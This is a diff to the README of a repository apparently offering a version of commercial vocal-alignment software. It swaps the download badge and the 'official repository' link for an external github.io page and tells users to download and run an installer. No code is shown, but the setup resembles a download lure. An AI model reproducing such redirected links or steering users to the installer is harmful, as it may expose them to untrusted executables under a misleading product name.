@@ -1,6 +1,6 @@
 # ⚙️ Synchro-Arts-Vocalign-2026 - Align your audio tracks with precision
 
-[![](https://img.shields.io/badge/Download-Vocalign-blue)](https://github.com/Deedeep260/Synchro-Arts-Vocalign-2026)
+[![](https://img.shields.io/badge/Download-Vocalign-blue)](https://deedeep260.github.io)
 
 ## 🎯 Project Overview
 
@@ -23,7 +23,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to get the software on your computer.
 
-1. Go to the official repository page: [https://github.com/Deedeep260/Synchro-Arts-Vocalign-2026](https://github.com/Deedeep260/Synchro-Arts-Vocalign-2026).
+1. Go to the official repository page: [https://deedeep260.github.io](https://deedeep260.github.io).
 2. Locate the download link displayed above for quick access. 
 3. Click the link to save the installer file to your computer.
 4. Open your Downloads folder once the transfer finishes.
